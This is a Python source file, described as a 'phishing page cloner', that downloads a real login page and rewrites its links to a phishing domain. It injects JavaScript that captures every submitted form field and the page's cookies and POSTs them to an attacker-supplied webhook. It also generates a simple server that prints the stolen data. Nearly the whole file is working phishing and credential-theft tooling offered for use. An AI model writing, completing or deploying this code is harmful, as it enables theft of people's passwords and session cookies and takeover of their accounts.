# -*- coding: utf-8 -*-
"""Phishing page cloner -- clone + inject credential capture.

Author: zxwn
"""
import urllib.request, re, base64, os
from urllib.parse import urljoin, urlparse


def clone_page(url: str) -> str:
    """Download and return HTML of target login page."""
    req = urllib.request.Request(url, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    resp = urllib.request.urlopen(req, timeout=15)
    html = resp.read().decode("utf-8", errors="replace")
    return html


def inject_capture(html: str, webhook_url: str) -> str:
    """Inject JavaScript credential capture into HTML page."""
    capture_js = """<script>
document.addEventListener('DOMContentLoaded', function() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        forms[i].addEventListener('submit', function(e) {
            var inputs = this.getElementsByTagName('input');
            var data = {};
            for (var j = 0; j < inputs.length; j++) {
                if (inputs[j].name) {
                    data[inputs[j].name] = inputs[j].value;
                }
            }
            data['url'] = window.location.href;
            data['cookies'] = document.cookie;
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '""" + webhook_url + """', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
        });
    }
});
</script>"""

    if "</body>" in html:
        html = html.replace("</body>", capture_js + "\n</body>")
    elif "</html>" in html:
        html = html.replace("</html>", capture_js + "\n</html>")
    else:
        html += capture_js
    return html


def rewrite_links(html: str, original_domain: str, phishing_domain: str) -> str:
    """Rewrite absolute URLs to point to phishing domain."""
    def _replace_src(m):
        url = m.group(1)
        if url.startswith("http") and original_domain in url:
            return 'src="{}"'.format(url.replace(original_domain, phishing_domain))
        return m.group(0)
    html = re.sub(r"src=\"([^\"]*)\"", _replace_src, html)
    html = re.sub(r"src='([^']*)'", _replace_src, html)
    html = re.sub(r"href=\"([^\"]*)\"", _replace_src, html)
    return html


def capture_server_code(port: int = 8080) -> str:
    """Generate simple HTTP server for credential capture."""
    return (
        "from http.server import HTTPServer, BaseHTTPRequestHandler\n"
        "import json\n\n"
        "class CaptureHandler(BaseHTTPRequestHandler):\n"
        "    def do_POST(self):\n"
        "        length = int(self.headers.get('Content-Length', 0))\n"
        "        data = self.rfile.read(length)\n"
        "        print(json.dumps(json.loads(data), indent=2), flush=True)\n"
        "        self.send_response(200)\n"
        "        self.end_headers()\n"
        "    def log_message(self, *args): pass\n\n"
        "HTTPServer(('0.0.0.0', {}), CaptureHandler).serve_forever()\n"
    ).format(port)


if __name__ == "__main__":
    print("[page_cloner] Loaded.")
